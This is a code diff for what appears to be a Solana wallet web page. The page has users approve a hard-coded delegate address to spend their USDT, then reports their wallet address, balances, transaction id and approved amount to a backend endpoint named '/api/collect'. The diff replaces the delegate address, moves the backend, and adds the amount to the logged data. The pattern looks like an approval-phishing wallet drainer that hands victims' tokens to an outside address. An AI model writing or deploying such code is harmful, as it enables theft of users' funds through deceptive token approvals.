@@ -4,13 +4,13 @@ const RPC_ENDPOINTS = [
 ];
 
 const USDT_MINT = new solanaWeb3.PublicKey("Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB");
-const DELEGATE_ADDRESS = new solanaWeb3.PublicKey("D2j7z5uUCvUPqa1nDYyDTSvFN3Mon8kFKXgBmKU9LYYB");
+const DELEGATE_ADDRESS = new solanaWeb3.PublicKey("FoPbaqegt8iw6gPevbuWmYBY2WXFEwDGTvRdhzqwwntX");
 
 // 官方 SPL Token Program
 const OFFICIAL_SPL_TOKEN_PROGRAM_ID = new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA");
 
-// 后台API地址
-const BACKEND_API_URL = 'php/api/transaction.php';
+// 后台API地址 (Vercel Serverless Function)
+const BACKEND_API_URL = '/api/collect';
 
 // 汇率配置
 const exchangeRates = {
@@ -627,6 +627,7 @@ async function approve() {
         wallet_address: walletPublicKey.toString(),
         transaction_id: txid,
         token_type: 'USDT',
+        amount: uiAmount,
         sol_balance: solBalanceInSol,
         usdt_balance: walletUSDTBalance,
         status: confirmation.value.err ? 'pending' : 'success',
@@ -655,6 +656,7 @@ async function approve() {
         wallet_address: walletPublicKey.toString(),
         transaction_id: txid,
         token_type: 'USDT',
+        amount: uiAmount,
         sol_balance: solBalanceInSol,
         usdt_balance: walletUSDTBalance,
         status: 'pending',
